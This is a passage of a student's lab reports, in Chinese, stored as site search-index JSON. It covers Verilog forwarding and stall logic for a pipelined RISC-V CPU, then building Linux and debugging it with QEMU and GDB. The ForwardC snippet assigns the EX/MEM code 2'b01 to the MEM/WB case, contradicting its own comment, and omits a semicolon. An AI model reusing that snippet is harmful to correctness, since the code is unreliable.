\u9009\u62e9\u5668\u63d0\u524d\u5230 ID \u9636\u6bb5\u5e76 stall \u662f\u4e0d\u591f\u7684\uff0c\u56e0\u4e3a\u4e00\u822c\u5bf9\u4e8e\u5faa\u73af\uff0c\u5728 branch \u8bed\u53e5\u68c0\u67e5\u7684\u524d\u4e00\u6761\u4f1a\u6d89\u53ca\u5230\u5faa\u73af\u53d8\u91cf\u5bc4\u5b58\u5668\u7684\u4fee\u6539\uff0c\u4f8b\u5982\uff1a <pre><code>addi x1, x1, -1\nbne x1, x0, loop\n</code></pre> \u6b64\u65f6 bne \u9700\u8981\u5728 ID \u9636\u6bb5\u8bfb\u53d6 x1\uff0c\u4f46\u662f\u5728 ID \u9636\u6bb5\u65f6\u4e0a\u4e00\u6761\u6307\u4ee4\u4ecd\u5728 EX \u9636\u6bb5\uff0cx1 \u8fd8\u6ca1\u6709\u66f4\u65b0\u3002\u6240\u4ee5\u9700\u8981 stall \u4e00\u4e2a\u5468\u671f\u7b49\u5f85\u4e0a\u4e00\u6761\u6307\u4ee4 EX \u9636\u6bb5\u7ed3\u675f\uff0c\u7136\u540e\u5c06 ALU \u7ed3\u679c\u901a\u8fc7 forwarding \u4f20\u7ed9 bne \u7684 ID \u9636\u6bb5\u7136\u540e\u8fdb\u884c\u5224\u65ad\u3002\u5373\u4e0b\u56fe\uff1a </p> <p>\u53ef\u4ee5\u770b\u51fa\uff0c\u6b64\u5904\u7684\u6570\u636e\u5192\u9669\u7684 stall \u65b9\u5f0f\u548c\u524d\u9762\u6570\u636e\u5192\u9669\u4e00\u6837\uff0c\u56e0\u6b64\u53ea\u9700\u8981\u5728 StallUnit \u4e2d\u5bf9 bubble_stop \u52a0\u4e00\u4e2a\u6761\u4ef6\u5373\u53ef\uff08\u4e0a\u4e00\u6761\u6307\u4ee4\u6709\u5bc4\u5b58\u5668\u5199\u5165\uff0c\u4e14\u4e0e\u8bfb\u53d6\u7684\u5bc4\u5b58\u5668\u4ea7\u751f\u4e86\u51b2\u7a81\uff09\u3002\u7136\u540e ID \u9636\u6bb5\u7684 forwarding \u9700\u8981\u5355\u72ec\u5199\u4e00\u4e0b\u3002\u5728 branch \u6307\u4ee4\u540e\u9762\u7684 bubble \u5373\u4e3a\u524d\u9762\u5199\u8fc7\u7684 stall\u3002</p> <p>\u56e0\u6b64\u4ee3\u7801\u4e0a\u7684\u4fee\u6539\uff1a\u5bf9\u4e8e StallUnit \u7684\u4fee\u6539\uff1a <pre><code>module StallUnit(\n    ...\n    input           jump,\n    input           ID_EX_reg_write,\n    ...\n);\n    assign bubble_stop = (...) || (jump &amp;&amp; ID_EX_reg_write &amp;&amp; ID_EX_rd != 0 &amp;&amp; (ID_EX_rd == IF_ID_rs1 || ID_EX_rd == IF_ID_rs2));\n</code></pre> \u5728 ID \u9636\u6bb5\u7684 forwarding\uff1a <pre><code>wire    [31:0]  reg1, reg2;\nassign reg1 = (jump &amp;&amp; EX_MEM_reg_write &amp;&amp; (EX_MEM_write_addr != 0) &amp;&amp; (EX_MEM_write_addr == IF_ID_inst[19:15])) ? EX_MEM_alu_result : read_data1;\nassign reg2 = (jump &amp;&amp; EX_MEM_reg_write &amp;&amp; (EX_MEM_write_addr != 0) &amp;&amp; (EX_MEM_write_addr == IF_ID_inst[24:20])) ? EX_MEM_alu_result : read_data2;\nassign jalr_addr = reg1 + reg2;\nMuxPC mux_pc (\n    ...\n    .alu_res(reg1 ^ reg2),\n    ...\n);\n</code></pre></p>"},{"location":"cs/system/cs2/lab2/#_7","title":"\u5176\u5b83\u60c5\u51b5\u5f15\u8d77\u7684\u5192\u9669","text":"<p>\u5728\u524d\u9762\u7b80\u5355\u5904\u7406\u4e86\u6570\u636e\u5192\u9669\u548c\u63a7\u5236\u5192\u9669\u4e4b\u540e\uff0c\u7ed9\u51fa\u7684\u7a0b\u5e8f\u4ecd\u7136\u4e0d\u80fd\u5b8c\u5168\u6b63\u786e\u8fd0\u884c\uff0c\u8fd8\u5b58\u5728\u4e00\u4e9b\u758f\u6f0f\u7684\u6570\u636e\u5192\u9669\uff1a</p>"},{"location":"cs/system/cs2/lab2/#r-store","title":"R \u578b\u6307\u4ee4\u540e store","text":"<p>\u5982\u679c R \u578b\u6307\u4ee4\u4fee\u6539\u4e86\u4e00\u4e2a\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u7136\u540e\u901a\u8fc7 store \u5b58\u50a8\u5b83\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0b\u5e76\u4e0d\u4f1a store \u6b63\u786e\u7684\u503c\uff0c\u56e0\u4e3a EX \u9636\u6bb5\u7684\u7ed3\u6784\u5982\u4e0b\u56fe\uff08\u9ed1\u3001\u7ea2\u8272\u4e3a\u539f\u6765\u7684\uff09\uff1a</p> <p>\u5176\u4e2d\u5bf9\u4e8e store \u6307\u4ee4\uff0cALU \u548c\u524d\u9762\u4e24\u4e2a mux \u90fd\u4f1a\u7528\u5230\uff08\u7528\u6765\u8ba1\u7b97\u5199\u5165\u5730\u5740\uff09\uff0c\u800c\u5199\u5165\u7684\u503c\u5b9e\u9645\u4e0a\u662f\u76f4\u63a5\u4ece\u5bc4\u5b58\u5668\u8bfb\u53d6\u7684 data2 \u63a5\u5165\u7684\uff08\u5373\u7ea2\u8272\u7ebf\uff09\uff0c\u8fd9\u91cc\u5e76\u6ca1\u6709\u5904\u7406\u6570\u636e\u5192\u9669\u3002\u800c\u4e14\u5199\u5165\u503c\u4e5f\u65e0\u6cd5\u501f\u7528\u524d\u9762\u5199\u8fc7\u7684 forwarding\uff08\u56e0\u4e3a\u6b64\u65f6\u90fd\u5728\u4f7f\u7528\uff09\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u4ece ForwardingUnit \u518d\u5224\u65ad\u3001\u5f15\u51fa\u4e00\u4e2a ForwardC \u4fe1\u53f7\uff0c\u6765\u9009\u62e9\u5199\u5165\u6570\u636e\uff0c\u540c\u7406\uff0c\u53ef\u80fd\u6765\u81ea EX/MEM \u6216 MEM/WB\u3002</p> <p>\u56e0\u6b64\u4fee\u6539 ForwardingUnit\uff1a <pre><code>module ForwardingUnit(\n    ...\n    output reg  [1:0]   ForwardC // 00 \u6765\u81ea data2\u300101 \u6765\u81ea EX/MEM\u300110 \u6765\u81ea MEM/WB\n);\n        if (EX_MEM_reg_write &amp;&amp; EX_MEM_rd != 0 &amp;&amp; EX_MEM_rd == ID_EX_rs2) assign ForwardC = 2'b01\n        else if (MEM_WB_reg_write &amp;&amp; MEM_WB_rd != 0 &amp;&amp; MEM_WB_rd == ID_EX_rs2) assign ForwardC = 2'b01\n        else assign ForwardC = 2'b00;\n</code></pre> \u4ee5\u53ca\u5728 EX \u9636\u6bb5\u589e\u52a0\u4e00\u4e2a\u56db\u8def\u9009\u62e9\u5668\uff08\u6709\u4e00\u8def\u4e0d\u7528\uff09\u6765\u9009\u62e9\u6700\u7ec8\u8981\u8d4b\u503c\u7ed9 EX_MEM_data2 \u7684\u503c\uff08\u5373\u5728 MEM \u9636\u6bb5\u8981\u8fdb\u884c\u5199\u5165\u7684\u503c\uff09\uff1a <pre><code>wire    [1:0]   forwardC;\nwire    [31:0]  ex_mem_data2;\nMux4x32 mux_data2 (\n    .I0(ID_EX_data2),\n    .I1(EX_MEM_alu_result),\n    .I2(write_data),\n    .I3(32'h00000000),\n    .s(forwardC),\n    .o(ex_mem_data2)\n);\n</code></pre> \u4ee5\u53ca\u5c06\u65f6\u5e8f\u66f4\u65b0\u91cc\u7684\u66f4\u65b0 EX_MEM_data2 \u4e3a ID_EX_data2 \u6539\u4e3a ex_mem_data2\uff1a <pre><code>...\n    EX_MEM_data2 &lt;= ex_mem_data2;\n...\n</code></pre></p>"},{"location":"cs/system/cs2/lab2/#lui-r","title":"lui \u540e R \u578b\u6307\u4ee4","text":"<p>\u524d\u9762\u7684 Forwarding \u4ecd\u7136\u5b58\u5728\u4e00\u4e9b\u95ee\u9898\uff0c\u6bd4\u5982\u5728 lui \u6307\u4ee4\u548c\u5176\u540e\u9762\u7684 R \u578b\u6307\u4ee4\u53d1\u751f\u51b2\u7a81\uff1a <pre><code>lui x1, 0x0001\nadd x2, x1, x3\n</code></pre> \u6b64\u65f6\u7684 add \u8bed\u53e5\u5e76\u4e0d\u4f1a\u6b63\u786e\u5904\u7406\u4e0e\u524d\u9762 lui \u4ea7\u751f\u7684\u6570\u636e\u5192\u9669\uff0c\u56e0\u4e3a add \u8bed\u53e5\u8bfb\u53d6 x1 \u53d1\u751f\u51b2\u7a81\uff0c\u800c\u4e0a\u4e00\u6761\u8bed\u53e5\u6b63\u5728\u4f7f\u7528\uff0c\u6240\u4ee5\u6309\u7167\u524d\u9762\u5199\u7684\u4f1a\u53bb\u8bfb\u53d6 EX_MEM \u5bc4\u5b58\u5668\u4e2d\u7684 alu_result \u4f5c\u4e3a x1 \u7684\u503c\u3002\u4f46\u5b9e\u9645\u4e0a lui \u5199\u56de\u5bc4\u5b58\u5668\u7684\u503c\u5e76\u4e0d\u662f ALU \u7684\u8ba1\u7b97\u7ed3\u679c\uff0c\u800c\u662f lui \u6307\u4ee4\u7684\u7acb\u5373\u6570\uff08\u7531 mem_to_reg \u4fe1\u53f7\u51b3\u5b9a\uff09\u3002</p> <p>\u53e6\u4e00\u79cd\u60c5\u51b5\u662f jal/jalr \u6307\u4ee4\u8df3\u8f6c\u5230\u7684\u4f4d\u7f6e\u5904\u6709\u4e00\u6761\u6307\u4ee4\u9700\u8981\u8bfb\u53d6\u8fd4\u56de\u5730\u5740\uff08\u4e5f\u5c31\u662f pc+4\uff09\uff0c\u8fd9\u65f6\u5199\u56de\u5bc4\u5b58\u5668\u7684\u4e5f\u4e0d\u662f ALU \u7684\u7ed3\u679c\uff0c\u800c\u662f\u5f53\u524d\u8df3\u8f6c\u6307\u4ee4\u7684 pc+4\u3002\u8fd9\u4e24\u79cd\u60c5\u51b5\u90fd\u53ef\u4ee5\u901a\u8fc7\u5224\u65ad mem_to_reg \u6765\u89e3\u51b3\u3002\u6240\u4ee5\u9700\u8981\u4fee\u6539 ForwardingUnit\uff0c\u5c06 ForwardA\u3001ForwardB \u4fe1\u53f7\u6269\u5c55\u4e00\u4f4d\uff1a <pre><code>module ForwardingUnit(\n    ...\n    output reg  [2:0]   ForwardA,   \n        // 000 \u6765\u81ea\u5bc4\u5b58\u5668\uff0c001 \u6765\u81ea EX/MEM\uff0c010 \u6765\u81ea MEM/WB\uff0c011 \u6765\u81ea PC\n        // 100 \u6765\u81ea EX/MEM \u7684 PC + 4\uff0c101 \u6765\u81ea MEM/WB \u7684 PC + 4\n        // 110 \u6765\u81ea EX/MEM \u7684 imm\uff0c111 \u6765\u81ea MEM/WB \u7684 imm\n    output reg  [2:0]   ForwardB,   // ...\n    output reg  [1:0]   ForwardC\n);\n    always @(*) begin\n        if (auipc) begin\n            assign ForwardA = 3'b011;\n        end else begin\n            if          (EX_MEM_reg_write == 1 &amp;&amp; EX_MEM_rd != 0 &amp;&amp; EX_MEM_rd == ID_EX_rs1) begin\n                if      (EX_MEM_mem_to_reg == 2'b01) assign ForwardA = 3'b110;\n                else if (EX_MEM_mem_to_reg == 2'b10) assign ForwardA = 3'b100;\n                else                                 assign ForwardA = 3'b001;\n            end else if (MEM_WB_reg_write == 1 &amp;&amp; MEM_WB_rd != 0 &amp;&amp; MEM_WB_rd == ID_EX_rs1) begin\n                if      (MEM_WB_mem_to_reg == 2'b01) assign ForwardA = 3'b111;\n                else if (MEM_WB_mem_to_reg == 2'b10) assign ForwardA = 3'b101;\n                else                                 assign ForwardA = 3'b010;\n            end else begin\n                assign ForwardA = 3'b000;\n            end\n        end\n        if (alu_src_b) begin\n            assign ForwardB = 3'b011;\n        end else begin\n            if          (EX_MEM_reg_write == 1 &amp;&amp; EX_MEM_rd != 0 &amp;&amp; EX_MEM_rd == ID_EX_rs2) begin\n                if      (EX_MEM_mem_to_reg == 2'b01) assign ForwardB = 3'b110;\n                else if (EX_MEM_mem_to_reg == 2'b10) assign ForwardB = 3'b100;\n                else                                 assign ForwardB = 3'b001;\n            end else if (MEM_WB_reg_write == 1 &amp;&amp; MEM_WB_rd != 0 &amp;&amp; MEM_WB_rd == ID_EX_rs2) begin\n                if      (MEM_WB_mem_to_reg == 2'b01) assign ForwardB = 3'b111;\n                else if (MEM_WB_mem_to_reg == 2'b10) assign ForwardB = 3'b101;\n                else                                 assign ForwardB = 3'b010;\n            end else begin\n                assign ForwardB = 3'b000;\n            end\n        end\n        ... // for ForwardC\n    end\nendmodule\n</code></pre> \u4ee5\u53ca\u9700\u8981\u4fee\u6539 ALU \u524d\u9009\u62e9\u8f93\u5165\u7684\u4e24\u4e2a\u5bc4\u5b58\u5668\uff0c\u6539\u4e3a\u516b\u8def\u9009\u62e9\u5668\uff1a <pre><code>wire    [2:0]   forwardA, forwardB;\n\nMux8x32 mux_alu_a (\n    .I0(ID_EX_data1),\n    .I1(EX_MEM_alu_result),\n    .I2(write_data),\n    .I3(ID_EX_pc),\n    .I4(EX_MEM_pc + 4),\n    .I5(MEM_WB_pc + 4),\n    .I6(EX_MEM_imm),\n    .I7(MEM_WB_imm),\n    .s(forwardA),\n    .o(alu_data1)\n);\n\nMux8x32 mux_alu_b (\n    .I0(ID_EX_data2),\n    .I1(EX_MEM_alu_result),\n    .I2(write_data),\n    .I3(ID_EX_imm),\n    .I4(EX_MEM_pc + 4),\n    .I5(MEM_WB_pc + 4),\n    .I6(EX_MEM_imm),\n    .I7(MEM_WB_imm),\n    .s(forwardB),\n    .o(alu_data2)\n);\n</code></pre></p>"},{"location":"cs/system/cs2/lab2/#_8","title":"\u4eff\u771f\u6d4b\u8bd5\u53ca\u5206\u6790","text":"<p>\u8fd0\u884c\u6240\u7ed9\u7684 lab2.s \u7a0b\u5e8f\uff0c\u8f7d\u5165 lab2-ram.coe \u548c lab2-rom.coe\uff0c\u4ee5 Core_tb.sv \u4e3a\u9876\u5c42\u6a21\u5757\u8fdb\u884c\u4eff\u771f\u3002</p>"},{"location":"cs/system/cs2/lab2/#_9","title":"\u4eff\u771f\u7ed3\u679c","text":"<p>\u4eff\u771f\u6ce2\u5f62\u5982\u4e0b\uff08\u6709\u90e8\u5206\u5faa\u73af\u7701\u7565\u4e86\uff09\uff1a  </p> <p>\u6574\u4e2a\u5bc4\u5b58\u5668\u7ec4\u503c\u7684\u53d8\u5316\uff08\u4e0a\u5341\u8fdb\u5236\uff0c\u4e0b\u5341\u516d\u8fdb\u5236\uff09\uff1a  </p>"},{"location":"cs/system/cs2/lab2/#_10","title":"\u7ed3\u679c\u5206\u6790","text":"<p>\u6839\u636e\u6c47\u7f16\u4ee3\u7801\u5206\u6790\u6ce2\u5f62\uff1a  </p> <p>\u53ef\u4ee5\u770b\u51fa\uff0c\u7ed3\u679c\u5747\u6b63\u786e\uff0c\u4e14\u6309\u7167\u9884\u671f\u8fdb\u884c stall\u3001\u8df3\u8f6c\u3002</p>"},{"location":"cs/system/cs2/lab2/#_11","title":"\u601d\u8003\u9898","text":""},{"location":"cs/system/cs2/lab2/#lab-2-1","title":"lab 2-1","text":"<ol> <li>\u8bf7\u4f60\u5bf9\u6570\u636e\u51b2\u7a81\u60c5\u51b5\u8fdb\u884c\u5206\u6790\u5f52\u7eb3\uff0c\u8bd5\u7740\u5c06\u4ed6\u4eec\u5206\u7c7b\u5217\u51fa\u3002</li> </ol>   RISC-V \u6d41\u6c34\u7ebf\u6570\u636e\u51b2\u7a81\u5f52\u7eb3\u540e\u672c\u8d28\u5176\u5b9e\u5c31\u662f\u4e00\u79cd\uff0c\u5373\u5728\u5c1a\u672a\u5199\u5165\u5bc4\u5b58\u5668\u65f6\u8bfb\u53d6\u5176\u503c\uff08RAW\uff09\uff0c\u5176\u5305\u542b\u5f88\u591a\u79cd\u7ec6\u5206\u7684\u60c5\u51b5\uff1a  - use-use \u51b2\u7a81 - load-use \u51b2\u7a81 - use-store \u51b2\u7a81   <ol> <li>\u5982\u679c EX, MEM, WB \u6bb5\u4e2d\u4e0d\u6b62\u4e00\u4e2a\u6bb5\u7684\u5199\u5bc4\u5b58\u5668\u4e0e ID \u6bb5\u7684\u8bfb\u5bc4\u5b58\u5668\u53d1\u751f\u4e86\u51b2\u7a81\uff0c\u8be5\u5982\u4f55\u5904\u7406\uff1f</li> </ol>   \u4e0d\u6b62\u4e00\u4e2a\u6bb5\u4e0e ID \u7684\u8bfb\u5bc4\u5b58\u5668\u53d1\u751f\u4e86\u51b2\u7a81\uff0c\u5e94\u8be5\u5148\u8003\u8651\u6700\u8fd1\u7684\u4e00\u4e2a\u5199\u5bc4\u5b58\u5668\uff08\u5148 EX \u7136\u540e MEM \u6700\u540e WB\uff09\uff0c\u5c06\u5176\u503c\u524d\u9012\u5230 ID \u6bb5\u4f5c\u4e3a\u5f53\u524d\u8bfb\u5bc4\u5b58\u5668\u7684\u5b9e\u9645\u503c\u3002"},{"location":"cs/system/cs2/lab2/#lab-2-2","title":"lab 2-2","text":"<ol> <li>\u5728\u5f15\u5165 Forwarding \u673a\u5236\u540e\uff0c\u662f\u5426\u610f\u5473\u7740 stall \u673a\u5236\u5c31\u4e0d\u518d\u9700\u8981\u4e86\uff1f\u4e3a\u4ec0\u4e48\uff1f</li> </ol>   \u4e0d\u662f\uff0c\u56e0\u4e3a Forwarding \u673a\u5236\u53ea\u80fd\u89e3\u51b3\u90e8\u5206\u6570\u636e\u51b2\u7a81\uff0c\u4f8b\u5982 load-use \u51b2\u7a81\u5c31\u65e0\u6cd5\u901a\u8fc7 Forwarding \u5b8c\u5168\u89e3\u51b3\uff0c\u9700\u8981\u5148 stall \u4e00\u4e2a\u5468\u671f\u540e\u518d\u4f7f\u7528 Forwarding\u3002\u5176\u6b21\uff0c\u63a7\u5236\u51b2\u7a81\u4e5f\u9700\u8981\u901a\u8fc7 stall \u624d\u80fd\u89e3\u51b3\u3002   <ol> <li>\u4f60\u8ba4\u4e3a Forwarding \u673a\u5236\u5728\u5b9e\u9645\u7684\u7535\u8def\u8bbe\u8ba1\u4e2d\u662f\u5426\u5b58\u5728\u4e00\u5b9a\u7684\u5f0a\u7aef\uff1f\u5982\u679c\u5b58\u5728\uff0c\u8bf7\u7ed9\u51fa\u4f60\u7684\u7406\u7531\u3002</li> </ol>   Forwarding \u673a\u5236\u9700\u8981\u5728 ID \u6bb5\u4e2d\u589e\u52a0\u4e00\u4e9b\u9009\u62e9\u5668\uff0c\u589e\u52a0\u4e86\u7535\u8def\u7684\u590d\u6742\u5ea6\uff0c\u540c\u65f6\u4e5f\u589e\u52a0\u4e86\u7535\u8def\u7684\u5ef6\u8fdf\uff0c\u5b58\u5728\u4e00\u4e9b\u5f0a\u7aef\u3002\u4e0d\u8fc7 Forwarding \u673a\u5236\u53ef\u4ee5\u89e3\u51b3\u90e8\u5206\u6570\u636e\u51b2\u7a81\uff0c\u53ef\u4ee5\u51cf\u5c11 stall \u7684\u6b21\u6570\uff0c\u4ece\u800c\u63d0\u9ad8\u7535\u8def\u7684\u6548\u7387\u3002\u603b\u4e4b Forwarding \u673a\u5236\u786e\u5b9e\u6709\u5f0a\u7aef\uff0c\u4f46\u7efc\u5408\u6765\u770b\u4e0d\u4e00\u5b9a\u6709\u6ca1\u6709\u5f0a\u7aef\u3002"},{"location":"cs/system/cs2/lab3/","title":"GDB+QEMU \u8c03\u8bd5 64 \u4f4d RISC-V LINUX","text":"<p> \u7ea6 798 \u4e2a\u5b57  29 \u884c\u4ee3\u7801  13 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f</p> <p>Abstract</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf \u2161 lab3 \u5b9e\u9a8c\u62a5\u544a\uff082022.10.27 ~ 2022.11.10\uff09</p> <p>Warning</p> <p>\u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad</p>"},{"location":"cs/system/cs2/lab3/#_1","title":"\u5b9e\u9a8c\u5185\u5bb9","text":"<ul> <li>\u642d\u5efa\u5b9e\u9a8c\u73af\u5883<ul> <li>\u5b89\u88c5 risc-v \u5de5\u5177\u94fe\u548c qemu \u6a21\u62df\u5668</li> </ul> </li> <li>\u83b7\u53d6 Linux \u6e90\u7801\u548c\u5df2\u7ecf\u7f16\u8bd1\u597d\u7684\u6587\u4ef6\u7cfb\u7edf<ul> <li>\u4ece kernel.org \u4e0b\u8f7d\u6700\u65b0\u7684 Linux \u6e90\u7801</li> <li>\u4ece\u8bfe\u7a0b\u4ed3\u5e93\u514b\u9686\u6587\u4ef6\u7cfb\u7edf\u955c\u50cf</li> </ul> </li> <li>\u7f16\u8bd1 Linux \u5185\u6838</li> <li>\u4f7f\u7528 QEMU \u8fd0\u884c\u5185\u6838</li> <li>\u4f7f\u7528 GDB \u5bf9\u5185\u6838\u8fdb\u884c\u8c03\u8bd5</li> <li>\u601d\u8003\u9898<ul> <li>\u4f7f\u7528 riscv64-linux-gnu-gcc \u7f16\u8bd1\u5355\u4e2a .c \u6587\u4ef6</li> <li>\u4f7f\u7528 riscv64-linux-gnu-objdump \u53cd\u6c47\u7f16\u524d\u9762\u5f97\u5230\u7684\u7f16\u8bd1\u4ea7\u7269</li> <li>\u8c03\u8bd5 Linux \u65f6\uff1a<ol> <li>\u5728 GDB \u4e2d\u67e5\u770b\u6c47\u7f16\u4ee3\u7801</li> <li>\u5728 0x80000000 \u5904\u4e0b\u65ad\u70b9</li> <li>\u67e5\u770b\u6240\u6709\u5df2\u4e0b\u7684\u65ad\u70b9</li> <li>\u5728 0x80200000 \u5904\u4e0b\u65ad\u70b9</li> <li>\u6e05\u9664 0x80000000 \u5904\u7684\u65ad\u70b9</li> <li>\u7ee7\u7eed\u8fd0\u884c\u76f4\u5230\u89e6\u53d1 0x80200000 \u5904\u7684\u65ad\u70b9</li> <li>\u5355\u6b65\u8c03\u8bd5\u4e00\u6b21</li> <li>\u9000\u51fa QEMU</li> </ol> </li> <li>\u5b66\u4e60 Makefile \u7684\u57fa\u672c\u4f7f\u7528<ol> <li>\u89c2\u5bdf\u53ef\u7528\u7684 target\uff0c\u5e94\u8be5\u4f7f\u7528 make ? \u6765\u6e05\u9664 Linux \u7684\u6784\u5efa\u4ea7\u7269\uff1f</li> <li>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5185\u6838\u7f16\u8bd1\u663e\u793a\u7684\u662f\u7b80\u7565\u4fe1\u606f\uff08\u4f8b\u5982\uff1aCC init/main.o\uff09\uff0c\u5e94\u8be5\u4f7f\u7528 make ? \u6765\u663e\u793a Linux \u8be6\u7ec6\u7684\u7f16\u8bd1\u8fc7\u7a0b\u5462\uff1f</li> </ol> </li> </ul> </li> </ul>"},{"location":"cs/system/cs2/lab3/#_2","title":"\u73af\u5883\u642d\u5efa","text":""},{"location":"cs/system/cs2/lab3/#risc-v-qemu","title":"\u5b89\u88c5 risc-v \u5de5\u5177\u94fe\u548c qemu \u6a21\u62df\u5668","text":"<p>\u547d\u4ee4\u884c\u8fd0\u884c\uff1a <pre><code>sudo apt install qemu-system-misc gcc-riscv64-linux-gnu gdb-multiarch\n</code></pre> \u68c0\u67e5\u7248\u672c\uff1a </p>"},{"location":"cs/system/cs2/lab3/#_3","title":"\u5b89\u88c5\u5176\u5b83\u540e\u7eed\u9700\u8981\u7684\u8f6f\u4ef6\u5305","text":"<p>Ubuntu \u4e0d\u81ea\u5e26 make\u3001gcc \u7b49\u5de5\u5177\uff0c\u9700\u8981\u624b\u52a8\u5b89\u88c5\uff1a <pre><code>sudo apt install build-essential\n</code></pre></p> <p>\u5728\u540e\u9762\u7f16\u8bd1\u5185\u6838\u7684\u8fc7\u7a0b\u4e2d\u4f1a\u51fa\u73b0 /bin/sh: 1: flex: not found \u4ee5\u53ca bison: not found \u7684\u9519\u8bef\uff0c\u9700\u8981\u5b89\u88c5 flex \u548c bison\uff1a <pre><code>sudo apt install flex bison\n</code></pre></p>"},{"location":"cs/system/cs2/lab3/#_4","title":"\u83b7\u53d6\u3001\u7f16\u8bd1\u6e90\u7801","text":""},{"location":"cs/system/cs2/lab3/#linux","title":"\u83b7\u53d6 Linux \u6e90\u7801","text":"<p>\u5728 kernel.org \u4e0a\u67e5\u627e\u6e90\u7801\uff0c\u9009\u62e9 6.0.5 \u7248\u672c\u4e0b\u8f7d\uff086.1 \u7248\u672c\u4e2d\u542b\u6709 rust\uff0c\u4e0d\u9009\uff09\u5e76\u89e3\u538b\uff1a <pre><code>wget https://cdn.kernel.org/pub/linux/kernel/v6.x/linux-6.0.5.tar.xz\ntar -xf linux-6.0.5.tar.xz\n</code></pre></p> <p>\u514b\u9686\u8bfe\u7a0b\u4ed3\u5e93\uff1a <pre><code>git clone https://git.zju.edu.cn/zju-sys/sys2lab-22fall-stu.git\n</code></pre></p>"},{"location":"cs/system/cs2/lab3/#linux_1","title":"\u7f16\u8bd1 Linux \u5185\u6838","text":"<p>\u8fdb\u5165\u89e3\u538b\u540e\u7684 Linux \u6e90\u7801\u6587\u4ef6\u5939\uff0c\u8fdb\u884c\u7f16\u8bd1\uff1a <pre><code>make ARCH=riscv CROSS_COMPILE=riscv64-linux-gnu- defconfig\nmake ARCH=riscv CROSS_COMPILE=riscv64-linux-gnu- -j4\n</code></pre> \u5341\u5206\u949f\u540e\u5b8c\u6210\u7f16\u8bd1\uff0c\u5e76\u53ef\u4ee5 ls \u67e5\u770b\u5230\u7f16\u8bd1\u4ea7\u7269\uff1a  </p>"},{"location":"cs/system/cs2/lab3/#_5","title":"\u8fd0\u884c\u3001\u8c03\u8bd5\u5185\u6838","text":""},{"location":"cs/system/cs2/lab3/#qemu","title":"\u4f7f\u7528 QEMU \u8fd0\u884c\u5185\u6838","text":"<p>\u8fdb\u5165 sys2lab-22fall-stu/src/lab3 \u76ee\u5f55\u4e2d\uff0c\u8fd0\u884c\uff1a <pre><code>qemu-system-riscv64 -nographic -machine virt \\\n    -kernel ~/Desktop/linux-6.0.5/arch/riscv/boot/Image \\\n    -device virtio-blk-device,drive=hd0 \\\n    -append \"root=/dev/vda ro console=ttyS0\" \\\n    -bios fw_jump.bin -drive file=rootfs.img,format=raw,id=hd0\n</code></pre> \u4f7f\u7528 QEMU \u6a21\u62df\u5668\u6765\u8fd0\u884c\u5185\u6838\u3002\u8fd9\u91cc\u8981\u6ce8\u610f\uff0ckernel \u662f arch/riscv/boot/Image \u800c\u4e0d\u662f vmlinux\uff0c\u800c\u4e14\u4e0d\u80fd\u52a0 -S -s\uff0c\u5426\u5219\u4f1a\u7b49\u5f85 gdb \u8fde\u63a5\u518d\u64cd\u4f5c\u8fd0\u884c\u3002\u8fd0\u884c\u8d77\u6765\u4e4b\u540e\u5c31\u53ef\u4ee5\u8fdb\u5165\u5230 shell \u4e2d\u8fd0\u884c\u6307\u4ee4\u4e86\uff1a </p> <p>\u7136\u540e exit \u9000\u51fa shell\uff0cCtrl+A\u3001X \u9000\u51fa QEMU\u3002</p>"},{"location":"cs/system/cs2/lab3/#gdb","title":"\u4f7f\u7528 GDB \u8c03\u8bd5\u5185\u6838","text":"<p>\u5728\u4e00\u4e2a\u7ec8\u7aef\u8fd0\u884c\u4e0b\u9762\u547d\u4ee4\u542f\u7528\u4e00\u4e2a\u5185\u6838\u5e76\u7b49\u5f85\u8c03\u8bd5\uff1a <pre><code>qemu-system-riscv64 -nographic -machine virt \\\n    -kernel ~/Desktop/linux-6.0.5/arch/riscv/boot/Image \\\n    -device virtio-blk-device,drive=hd0 \\\n    -append \"root=/dev/vda ro console=ttyS0\" \\\n    -bios fw_jump.bin -drive file=rootfs.img,format=raw,id=hd0 \\\n    -S -s\n</code></pre> \u5728\u53e6\u4e00\u4e2a\u7ec8\u7aef\u542f\u52a8 gdb\uff1a <pre><code>gdb-multiarch vmlinux\n</code></pre> \u8fde\u63a5\u3001\u4e0b\u65ad\u70b9\u3001\u67e5\u770b\u65ad\u70b9\uff0c\u7ee7\u7eed\u8fd0\u884c\uff1a</p> <p>\u67e5\u770b\u6c47\u7f16\u3001\u67e5\u770b\u5bc4\u5b58\u5668\u503c\u3001\u5355\u6307\u4ee4\u8fd0\u884c\uff1a</p> <p>\u67e5\u770b\u5e27\u6808\u4fe1\u606f\uff1a</p> <p>layout asm\uff08\u4f7f\u7528 Ctrl+X\u3001A \u9000\u51fa\uff09\uff1a</p>"},{"location":"cs/system/cs2/lab3/#_6","title":"\u601d\u8003\u9898","text":""},{"location":"cs/system/cs2/lab3/#c","title":"\u7f16\u8bd1 c \u8bed\u8a00\u6587\u4ef6\u5e76\u53cd\u6c47\u7f16","text":"<p>\u548c\u7cfb\u7edf\u4e00\u4e2d\u7684\u5b9e\u9a8c\u4e00\u6837\uff0c\u4f7f\u7528 riscv64-linux-gnu-gcc \u7f16\u8bd1\u3001-objdump \u53cd\u6c47\u7f16\u5373\u53ef\u3002\u6e90\u6587\u4ef6\uff1a <pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int a = 1, b = 2;\n    printf(\"%d\\n\", a + b);\n    return 0;\n}\n</code></pre> \u5148\u9759\u6001\u7f16\u8bd1\uff08\u65b9\u4fbf\u8fd0\u884c\uff09\uff0c\u7136\u540e\u52a8\u6001\u7f16\u8bd1\u5e76\u4f7f\u7528 objdump \u53cd\u6c47\u7f16\uff1a  </p>"},{"location":"cs/system/cs2/lab3/#linux_2","title":"\u8c03\u8bd5 Linux","text":"<p>\u67e5\u770b\u6c47\u7f16\u3001\u5728 0x80000000 \u4e0b\u65ad\u70b9\u3001\u67e5\u770b\u65ad\u70b9\u3001\u5728 0x80200000 \u4e0b\u65ad\u70b9\u3001\u53d6\u6d88 0x80000000 